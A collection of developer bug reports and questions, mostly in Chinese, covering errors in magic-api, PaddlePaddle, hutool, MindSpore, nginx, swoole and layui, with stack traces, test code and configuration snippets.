1.6.3版本 sql 动态拼接报错,"2021-11-10 09:46:54 info 执行SQL：insert into sysapp ( project_id, app_name, app_code, app_info, app_typ ) values ( ?, ?, ?, ?, ) 2021-11-10 09:46:54 info 数据源：sysapp 2021-11-10 09:46:54 info SQL参数：1(Integer), 统一租户管理(String), tenant(String), 统一租户管理(String), 1(Integer) 2021-11-10 09:46:54 debug Executing SQL update and returning generated keys 2021-11-10 09:46:54 debug Executing prepared SQL statement 2021-11-10 09:46:54 trace Setting SQL statement parameter value: column index 1, parameter value [1], value class [java.lang.Integer], SQL type unknown 2021-11-10 09:46:54 trace Setting SQL statement parameter value: column index 2, parameter value [统一租户管理], value class [java.lang.String], SQL type unknown 2021-11-10 09:46:54 trace Setting SQL statement parameter value: column index 3, parameter value [tenant], value class [java.lang.String], SQL type unknown 2021-11-10 09:46:54 trace Setting SQL statement parameter value: column index 4, parameter value [统一租户管理], value class [java.lang.String], SQL type unknown 2021-11-10 09:46:54 trace Setting SQL statement parameter value: column index 5, parameter value [1], value class [java.lang.Integer], SQL type unknown 2021-11-10 09:46:54 error 接口/app/add请求出错org.ssssssss.script.exception.MagicScriptException: PreparedStatementCallback; Parameter index out of range (5 &gt; number of parameters, which is 4).; nested exception is java.sql.SQLException: Parameter index out of range (5 &gt; number of parameters, which is 4). at Row:35<del>35,Col:27</del>37 return db.sysapp.insert(sql) ^^^^^^^^^^^ at org.ssssssss.script.MagicScriptError.error(MagicScriptError.java:71) at org.ssssssss.script.MagicScriptError.transfer(MagicScriptError.java:115) at org.ssssssss.script.MagicScript.execute(MagicScript.java:109) at org.ssssssss.magicapi.script.ScriptManager.executeScript(ScriptManager.java:25) at org.ssssssss.magicapi.controller.RequestHandler.invokeRequest(RequestHandler.java:300) at org.ssssssss.magicapi.controller.RequestHandler.invoke(RequestHandler.java:159) at sun.reflect.GeneratedMethodAccessor205.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1063) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.ssssssss.magicapi.config.MagicCorsFilter.doFilter(MagicCorsFilter.java:47) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:745) Caused by: java.sql.SQLException: Parameter index out of range (5 &gt; number of parameters, which is 4). at org.springframework.jdbc.support.SQLStateSQLExceptionTranslator.doTranslate(SQLStateSQLExceptionTranslator.java:110) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:70) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:79) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:79) at org.springframework.jdbc.core.JdbcTemplate.translateException(JdbcTemplate.java:1541) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:667) at org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:991) at org.ssssssss.magicapi.modules.SQLModule.insert(SQLModule.java:410) at org.ssssssss.magicapi.modules.SQLModule.insert(SQLModule.java:387) at org.ssssssss.magicapi.modules.SQLModule.insert(SQLModule.java:378) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.ssssssss.script.reflection.MethodInvoker.invoke(MethodInvoker.java:29) at org.ssssssss.script.reflection.JavaInvoker.invoke0(JavaInvoker.java:96) at org.ssssssss.script.runtime.handle.FunctionCallHandle.invoke_method(FunctionCallHandle.java:127) at MagicScript_15.execute(MagicScript_15.ms:35) at org.ssssssss.script.MagicScript.execute(MagicScript.java:103) ... 55 more   <code>: var sql = """""" insert into sys_app &lt;trim prefix=""("" suffix="")"" suffixOverrides="",""&gt; &lt;if test=""project_id != null""&gt;project_id,&lt;/if&gt; &lt;if test=""app_name != null""&gt;app_name,&lt;/if&gt; &lt;if test=""app_code != null""&gt;app_code,&lt;/if&gt; &lt;if test=""app_info != null""&gt;app_info,&lt;/if&gt; &lt;if test=""app_type != null""&gt;app_type,&lt;/if&gt; &lt;/trim&gt; &lt;trim prefix=""values ("" suffix="")"" suffixOverrides="",""&gt; &lt;if test=""project_id != null""&gt;#{project_id},&lt;/if&gt; &lt;if test=""app_name != null""&gt;#{app_name},&lt;/if&gt; &lt;if test=""app_code != null""&gt;#{app_code},&lt;/if&gt; &lt;if test=""app_info != null""&gt;#{app_info},&lt;/if&gt; &lt;if test=""app_type != null""&gt;#{app_type},&lt;/if&gt; &lt;/trim&gt; """""" return db.sysapp.insert(sql)"
单机训练auc正常，集群训练auc全部都是0是为什么呢？,"程序单机训练的auc是对的，集群训练上无论训练集（event.metrics）还是测试集（results.metrics）打印出来都是0是为什么呢？训练数据和测试数据肯定是正常的，已经检验过了，不存在连续1或者0分布。 集群训练程序打印auc的方式如下： cluster_data_reader()是读取文件yield数据的方法，没有问题。trainer的写法是： 这样每轮递归结束后，训练集（Pass 0）和测试集(Test 0）的结果都是0，是什么地方出了问题呢？   <code>: def event_handler(event): if isinstance(event, paddle.event.EndIteration): if (event.batch_id + 1) % 400 == 0: print ""\nPass %d Batch %d Cost %.4f %s"" % ( event.pass_id, event.batch_id, event.cost, event.metrics) result = trainer.test( reader=paddle.batch(cluster_data_reader(cluster_test_dir, node_id), batch_size = 1024), feeding=feeding) print ""\nTest %d, Cost %6f, %s"" % (event.pass_id, result.cost, result.metrics) trainer.train( reader=paddle.batch( paddle.reader.shuffle(cluster_data_reader(cluster_train_dir, node_id), buf_size=102400), batch_size=1024), event_handler=event_handler, feeding=feeding, num_passes=20) auc_layer = paddle.layer.slope_intercept(input=inference, name='auc_layer', slope=0.5, intercept=0.5) cost = paddle.layer.regression_cost(input=auc_layer, label=label) parameters = paddle.parameters.create(cost) trainer = paddle.trainer.SGD( cost = cost, extra_layers = paddle.evaluator.auc(input=auc_layer, label=label), parameters = parameters, update_equation = paddle.optimizer.Adam(learning_rate=2e-4), is_local = False) Thu Aug 9 15:04:48 2018[1,0]&lt;stdout&gt;:Pass 0 Batch 399 Cost 0.1073 {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:04:48 2018[1,3]&lt;stdout&gt;: Thu Aug 9 15:04:48 2018[1,3]&lt;stdout&gt;:Pass 0 Batch 399 Cost 0.1220 {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:04:48 2018[1,2]&lt;stdout&gt;: Thu Aug 9 15:04:48 2018[1,2]&lt;stdout&gt;:Pass 0 Batch 399 Cost 0.1143 {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:04:48 2018[1,1]&lt;stdout&gt;: Thu Aug 9 15:04:48 2018[1,1]&lt;stdout&gt;:Pass 0 Batch 399 Cost 0.1155 {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:04:48 2018[1,4]&lt;stdout&gt;: Thu Aug 9 15:04:48 2018[1,4]&lt;stdout&gt;:Pass 0 Batch 399 Cost 0.1208 {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:17:22 2018[1,2]&lt;stdout&gt;: Thu Aug 9 15:17:22 2018[1,2]&lt;stdout&gt;:Test 0, Cost 0.114977, {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:17:26 2018[1,0]&lt;stdout&gt;: Thu Aug 9 15:17:26 2018[1,0]&lt;stdout&gt;:Test 0, Cost 0.114977, {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:17:28 2018[1,4]&lt;stdout&gt;: Thu Aug 9 15:17:28 2018[1,4]&lt;stdout&gt;:Test 0, Cost 0.114977, {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:17:30 2018[1,3]&lt;stdout&gt;: Thu Aug 9 15:17:30 2018[1,3]&lt;stdout&gt;:Test 0, Cost 0.114977, {'__auc_evaluator_0__': 0.0} Thu Aug 9 15:17:40 2018[1,1]&lt;stdout&gt;: Thu Aug 9 15:17:40 2018[1,1]&lt;stdout&gt;:Test 0, Cost 0.114977, {'__auc_evaluator_0__': 0.0}"
HttpRequest.post(url).body(json) 报错,"JDK版本： openjdk_8_131 hutool版本： 5.1.2 不知道是不是https的原因，改用HttpClient的方式正常运行 堆栈信息 <ol start=""3"">   <code>: cn.hutool.http.HttpRequest.post(""https://xxx"").body(json).execute().body(); java.net.SocketException: Connection reset at java.net.SocketInputStream.read(SocketInputStream.java:210) at java.net.SocketInputStream.read(SocketInputStream.java:141) at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) at sun.security.ssl.InputRecord.read(InputRecord.java:503) at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) at sun.net.www.protocol.http.HttpURLConnection.getOutputStream0(HttpURLConnection.java:1316) at sun.net.www.protocol.http.HttpURLConnection.getOutputStream(HttpURLConnection.java:1291) at sun.net.www.protocol.https.HttpsURLConnectionImpl.getOutputStream(HttpsURLConnectionImpl.java:250) at cn.hutool.http.HttpConnection.getOutputStream(HttpConnection.java:442) at cn.hutool.http.HttpRequest.sendFormUrlEncoded(HttpRequest.java:1089) at cn.hutool.http.HttpRequest.send(HttpRequest.java:1061) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:935) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:901)"
[CT][MS][Adaptiveavgpool3d]Grad test result  incorrect at gpu,"GPU后端，Adaptiveavgpool3d fp16, fp32, fp64反向计算结果不正确 / 硬件环境: /device GPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph Gpu后端执行测试用例 计算结果正确，对标通过 反向计算结果不正确   <code>: class AdaptiveAvgPool3DMock(OpsFactory): def __init__(self, inputs=None, grads=None): self.torch_support = [np.float32, np.float64] self.ms_type = inputs[0].dtype super().__init__(dtype=dtype_to_nptype(self.ms_type)) self.input_x = inputs[0] self.output_size = inputs[1] if len(self.input_x.shape) == 0: self.input_x_np = inputs[0] else: self.input_x_np = inputs[0].asnumpy() if len(self.output_size.shape) == 0: self.output_size_np = inputs[1] else: self.output_size_np = inputs[1].asnumpy() if grads is None or len(grads) == 0: self.out_grad_np = None else: self.out_grad_np = grads[0].asnumpy() self.torch_support = self.input_x_np.dtype in self.torch_support def forward_mindspore_impl(self): net = AdaptiveAvgPool3DtNet() out = net(self.input_x, self.output_size) return out.asnumpy() def forward_pytorch_impl(self): output_size = torch.from_numpy(self.output_size_np) if self.torch_support: x = torch.from_numpy(self.input_x_np) else: x = torch.from_numpy(self.input_x_np.astype(np.float32)) out = F.adaptive_avg_pool3d(x, output_size) return out.numpy().astype(self.dtype) def forward_cmp(self): out_mindspore = self.forward_mindspore_impl() out_torch = self.forward_pytorch_impl() allclose_nparray(out_torch, out_mindspore, self.loss, self.loss) def grad_mindspore_impl(self): if self.out_grad_np is None: self.out_grad_np = self.forward_pytorch_impl() net = AdaptiveAvgPool3DtNet() grad_net = GradOfFirstInput(net) grad_net.set_train() input_grad = grad_net(self.input_x, self.output_size, Tensor(self.out_grad_np)) return input_grad.asnumpy() def grad_pytorch_impl(self): output_size = torch.from_numpy(self.output_size_np) if self.torch_support: x = torch.tensor(self.input_x_np, requires_grad=True) grad = torch.from_numpy(self.out_grad_np) else: x = torch.tensor(self.input_x_np.astype(np.float32), requires_grad=True) grad = torch.from_numpy(self.out_grad_np.astype(np.float32)) output_torch = F.adaptive_avg_pool3d(x, output_size) output_torch.backward(grad) return x.grad.numpy().astype(self.dtype) def test_adaptiveavgpool3d_5d_float16(): input_x = Tensor(np.random.randn(2, 2, 128, 16, 64).astype(np.float16)) input_output_size = Tensor(np.random.randint(0, 128, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3DMock(inputs=[input_x, input_output_size]) fact.forward_cmp() &gt; fact.grad_cmp() def test_adaptiveavgpool3d_5d_float16(): input_x = Tensor(np.random.randn(2, 2, 128, 16, 64).astype(np.float16)) input_output_size = Tensor(np.random.randint(0, 128, size=(3,)).astype(np.int32)) fact = AdaptiveAvgPool3DMock(inputs=[input_x, input_output_size]) fact.forward_cmp() &gt; fact.grad_cmp() test_adaptiveavgpool3d.py:133: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/adaptiveavgpool3d_ops.py:94: in grad_cmp allclose_nparray(input_grad_mindspore, input_grad_torch, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[ 3.1708e-02, 4.2175e-02, 1.0468e-02, ..., 8.8135e-02, 1.9019e-01, 1.0205e-01], [-... [-9.7900e-02, -9.8389e-02, -4.7302e-04, ..., 1.2317e-01, 9.7046e-02, -2.6062e-02]]]]], dtype=float16) data_me = array([[[[[ 1.9336e-01, 2.4780e-01, 5.4413e-02, ..., 1.4111e-01, 3.0957e-01, 1.6846e-01], [-... [-9.7900e-02, -9.8389e-02, -4.7803e-04, ..., 1.2311e-01, 9.7046e-02, -2.6062e-02]]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 0.0317 0.04218 0.01047 ... -0.10364 0.1295 0.5415 ] E data_me_error:[ 0.1934 0.2478 0.0544 ... -0.04303 0.2878 0.569 ] E loss:[0.1616 0.2056 0.04395 ... 0.0606 0.1583 0.02734]"
nginx访问项目正常，但是访问图片报404,我用我的域名与ip访问项目一切正常，但是访问上传图片地址的时候却不行。 1、这是我nginx的配置 server { #SSL 访问端口号为 443 listen 443 ssl; #填写绑定证书的域名 server_name www.xxx.com; #证书文件名称 ssl_certificate 1_www.xxx.com_bundle.crt; #私钥文件名称 ssl_certificate_key 2_www.xxx.com.key; ssl_session_timeout 5m; #请按照以下协议配置 ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #请按照以下套件配置，配置加密套件，写法遵循 openssl 标准。 ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; ssl_prefer_server_ciphers on; location / { proxy_pass http://ip:8080/; #proxy_set_header Host $http_host; #proxy_set_header X-Real-IP $remote_addr; #proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #proxy_set_header X-Forwarded-For $remote_addr; #proxy_headers_hash_max_size 51200; #proxy_headers_hash_bucket_size 6400; root html; index index.html index.htm; } location /profile/ { # 方式一：指向地址 proxy_pass https://ip:8080/; } } server { listen 80; server_name www.xxx.com; #charset koi8-r; #access_log logs/host.access.log main; 2、文件上传路径（linux）：/data/www/images 3、访问方式（文件肯定存在，这个原因可以忽略） 1：https://www.xxx.com/profile/upload/2021/07/06/d5f1007d-30b1-4aed-8ae0-9a43fb0f7dfa.png，报 502 2：https://www.xxx.com/upload/2021/07/06/d5f1007d-30b1-4aed-8ae0-9a43fb0f7dfa.png，报404 3：https://www.xxx.com/2021/07/06/d5f1007d-30b1-4aed-8ae0-9a43fb0f7dfa.png，直接跳转到系统登录页 万分感谢作者回答。   <code>: location / { root html; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } location ~ .*\.(gif|jpg|jpeg|png)$ { expires 24h; root /data/www/images/;#指定图片存放路径 access_log /data/www/images/nginx/logs/images.log;#图片 日志路径 proxy_store on; proxy_store_access user:rw group:rw all:rw; proxy_temp_path /data/www/images/;#代理临时路径 proxy_redirect off; proxy_set_header Host 188.131.142.235; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 10m; client_body_buffer_size 1280k; proxy_connect_timeout 900; proxy_send_timeout 900; proxy_read_timeout 900; proxy_buffer_size 40k; proxy_buffers 40 320k; proxy_busy_buffers_size 640k; proxy_temp_file_write_size 640k; if ( !-e $request_filename) { proxy_pass http://188.131.142.235:8080;#代理访问地址 } } location /profile/ { # 方式一：指向地址 proxy_pass https://ip:8080/; } #把http的域名请求转成https return 301 https://$host$request_uri; }
The Python API about pool2d.,"The arguments in pool2d is as follows: https://github.com/PaddlePaddle/Paddle/blob/5a3d1362f7fa7c0e3a18524afc201a4a70e0f0ce/python/paddle/v2/fluid/layers.py#L748-L755 Since this operator has called , the prefix in for , , is not needed. is not exact, the kernel_size/kernel_shape is better. The should be None by defalut. Since the users can set , the is infered in C++ code by input. I think the argument name should be more formal and we can follow ONNX.   <code>: pool2d pool_ pool_size pool_stride pool_padding pool_size pool_size global_pooling=True pool_size"
Wrong shared weight in fc layer when input is a sequence and the parameter name is manually set,"Code: Error message: Shared parameter ""w"" does not have same size: 3 vs. 2 This happens because the python wrapper applies the same param_attr to x1 and x2 when the parameter name is manually set. The python wrapper does not check this. This may cause unexpected sharing of weights between x1 and x2. For example, if the dimension of both x1 and x2 is 3, the above code would not raise exception and x1, x2 would share the same weights, which may not be the expect of users.   <code>: import paddle.v2 as paddle x1 = paddle.layer.data(name='x1', type=paddle.data_type.dense_vector(3)) x2 = paddle.layer.data(name='x2', type=paddle.data_type.dense_vector(2)) fc = paddle.layer.fc(input=[x1, x2], size=1, param_attr=paddle.attr.Param(name=""w"", initial_mean=1.0, initial_std=0.0))"
在训练过程中验证模型，train loss 不下降,"PaddlePaddle版本： GPU：、、 系统环境：、 训练信息 单机单卡，通过 限制为单卡 显存信息： 需求：在训练的过程中验证模型效果，但数据源不同。 做法（已简化）： 全部训练代码请见 https://github.com/ShaneTian/Induction-Networks/blob/master/train.py 问题：在第一次 val 之前， 是不断下降的，但是在做完一次 val 之后，再循环 train 时，loss 不会再下降了   <code>: paddlepaddle-gpu 1.7.0.post107 TITAN RTX cudatoolkit 10.0.130 cudnn 7.3.1 CentOS Linux 7.6.1810 Python 3.7.4 CUDA_VISIBLE_DEVICES=0 3178MiB / 24190MiB model = network() train_prog = fluid.default_main_program() train_startup = fluid.default_startup_program() loss = model.loss mean_acc = model.mean_acc val_prog = train_prog.clone(for_test=True) test_prog = train_prog.clone(for_test=True) optimizer = fluid.optimizer.Adam(learning_rate=1e-3) optimizer.minimize(loss) place = fluid.CUDAPlace(0) exe = fluid.Executor(place) exe.run(train_startup) compiled_train_prog = fluid.CompiledProgram(train_prog).with_data_parallel(loss_name=loss.name) compiled_val_prog = fluid.CompiledProgram(val_prog).with_data_parallel(share_vars_from=compiled_train_prog) compiled_test_prog = fluid.CompiledProgram(test_prog).with_data_parallel(share_vars_from=compiled_train_prog) for train_data in train_reader(): # ... (train_cur_loss, train_cur_acc) = exe.run(program=compiled_train_prog, feed=train_data, fetch_list=[loss.name, mean_acc.name]) # ... for eval_data in val_reader(): eval_cur_acc, = exe.run(program=compiled_val_prog, feed=eval_data, fetch_list=[mean_acc.name]) # ... train_cur_loss"
1.9.9 swoole 版本log_file文件名（长度为32时），文件名乱码,"1.9.9 swoole 版本log_file文件名乱码 文件名长度为32并且配置了task_worker_num时必现。 strace -f -e open php 1.php 1.php 内容   <code>: open(""/tmp/log/logfile123456789012.log\360\260\""\274\336\177"", O_RDWR|O_CREAT|O_APPEND, 0666) = 5 &lt;?php $serv = new Swoole\Http\Server(""127.0.0.1"", 9508); $setting = [ 'log_file' =&gt; '/tmp/log/logfile123456789012.log', 'task_worker_num'=&gt;0, ]; $serv -&gt; set($setting); $serv-&gt;on('Request', function($request, $response) { $response-&gt;cookie(""User"", ""Swoole""); $response-&gt;header(""X-Server"", ""Swoole""); $response-&gt;end(""&lt;h1&gt;Hello Swoole!&lt;/h1&gt;""); }); if (isset($setting['task_worker_num'])) { $serv-&gt;on('Task', function(){}); $serv-&gt;on('Finish', function(){}); } $serv-&gt;start(); [root@CentOS67-120-201 ~]# ll /tmp/log total 0 -rw-r--r-- 1 root root 0 May 3 21:05 logfile123456789012.log??""??? -rw-r--r-- 1 root root 0 May 3 21:03 logfile123456789012.log?????? -rw-r--r-- 1 root root 0 May 3 20:57 logfile123456789012.log??""?1? -rw-r--r-- 1 root root 0 May 3 20:54 logfile12345.log"
关于文件上传组件lay-upload的问题,"@就眠儀式 暂时发现的问题： 1.acceptMime属性无效，没设置该属性和设置了为images（官网文档说默认值是这个）时弹出选择框都是全部文件类型可选。 2.field属性无效，设置了该属性的时候也和没设置一样。 3.multiple没开启多文件上传，传到后端确是数组file[0]，layui是：file 4.done事件把后端返回的结果做了什么处理?比如后端返回： done事件得到的是这样的数据： 6.后端接口返回错误的时候（比如500状态码），error事件也没执行，同样也试了layui的上传人家是执行的   <code>: {""state"":1,""msg"":""文件上传成功！"",""data"":{""fileurl"":""\/upfiles\/attachment\/20220822\/004a8325dccc482b33127784eb2f4b3e.jpg""}}"
[ST][MS]Constantpad1d 2d 3d 以及zeropad2d 算子异常场景报错信息需要修改,"Constantpad1d 2d 3d 以及zeropad2d 算子异常场景报错信息 普遍不符合白名单规范要求， 此处只做一个示例 / 硬件环境: /device GPU : -- MindSpore version :commit_id = ''[sha1]:d880705e,[branch]:(HEAD,origin/r1.8,r1.8)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_ops_constantpad3d_abnormal_input_4d_nagative_padding_last_3th_dim_both_out_of_range.py cd solution_test/cases/04operator/12nn/constantpad3d pytest -s test_ms_ops_constantpad3d_abnormal_input_4d_nagative_padding_last_3th_dim_both_out_of_range.py 报错信息符合白名单规范 ...../DFx/报错白名单/MindSpore日志与错误信息规范V1.4.docx 一般像算子的就是：For 算子名, the parameter 'xxx' must be ..., but got .. . 责任人 刘志丹   <code>: The input size 2, plus negative padding -1 and -1 resulted in a non-positive output size, which is invalid. Check dimension of your input"
模块开发自定义后台界面，Web端组件问题,引入系统的吧，各种冲突，不引入吧 又无法使用微擎内置的 web组件，麻烦问下这个怎么解决，官方可以把组件抽离方便开发者引入吗？ 安装了官方的示例模块，发现也是未解决.....   <code>: {template 'common/header-base'}
在自动化并行模式下，使用nn.conv3d存在报错,"在自动化并行模式下，使用nn.conv3d存在报错 / 硬件环境: GPU : -- MindSpore version :1.8.1 -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph 测试代码test_conv3d.py如下 mpirun -n 2 --allow-run-as-root python test_conv3d.py 预期就是能正常训练   <code>: import os import numpy as np import mindspore as ms from mindspore import context, nn, ops from mindspore.train import Model from mindspore.train.callback import LossMonitor import mindspore.dataset as ds from mindspore.communication import init, get_rank, get_group_size class Loss(nn.Cell): def __init__(self): super(Loss,self).__init__() self.reduce_mean = ops.ReduceMean() self.abs = ops.Abs() def construct(self, x, target=None): return self.abs(self.reduce_mean(x)) class Net(nn.Cell): def __init__(self): super().__init__() self.mask = nn.Conv3d(24, 12, 3) def construct(self, x): x = self.mask(x) return x class Dataset: def __init__(self): self.data = np.random.randn(8, 1, 24, 36, 75, 104).astype(np.float32) def __getitem__(self, idx): return self.data[idx], idx def __len__(self): return self.data.shape[0] def train(): os.environ[""CUDA_VISIBLE_DEVICES""] = '1, 3' context.set_context(mode=context.GRAPH_MODE, device_target='GPU') ms.set_auto_parallel_context(parallel_mode=ms.ParallelMode.AUTO_PARALLEL, search_mode=""dynamic_programming"") init(""nccl"") rank_id = get_rank() device_num = get_group_size() dataset = Dataset() data_loader = ds.GeneratorDataset(dataset, column_names=['data', 'label'], shuffle=False, shard_id=rank_id, num_shards=device_num) network = Net() optimizer = nn.SGD(network.trainable_params(), learning_rate=0.001) net_loss = Loss() model = Model(network, net_loss, optimizer=optimizer) print(""start traning"") model.train(epoch=1, train_dataset=data_loader, callbacks=[LossMonitor()]) if __name__ == ""__main__"": train()"
FileUtil.getType 方法有bug,"JDK版本： jdk1.8.0_92 hutool版本： 5.4.2 用FileUtil.getType去获取.ppt类型时，返回 xls类型   <code>: @Test public void getFileType(){ System.out.println(FileUtil.getType(new File(""D:\\111.ppt""))); } 返回：xls"
controller里弹出提醒,"controller里面调用该方法 想再查询为空的情况抛出一个提醒 不能用return renderResult(Global.FALSE, ""查询为空！""); 该怎么处理？》   <code>: public Page&lt;AppUserRisk&gt; findPage(Page&lt;AppUserRisk&gt; page, AppUserRisk appUserRisk) { return super.findPage(page, appUserRisk); }"
